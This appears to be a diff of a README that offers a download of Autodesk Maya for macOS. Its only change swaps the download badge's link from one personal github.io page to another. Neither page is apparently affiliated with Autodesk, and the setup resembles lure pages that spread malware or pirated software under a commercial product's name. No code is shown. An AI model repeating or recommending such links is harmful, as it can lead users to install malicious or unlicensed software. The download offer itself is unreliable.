@@ -4,7 +4,7 @@
 
 ## 📥 Download Autodesk Maya for macOS
 
-[![⬇️ Download Autodesk Maya Mac](https://img.shields.io/badge/Download-Autodesk%20Maya%20Mac-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/Autodesk)
+[![⬇️ Download Autodesk Maya Mac](https://img.shields.io/badge/Download-Autodesk%20Maya%20Mac-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/Autodesk)
 
 ---
 
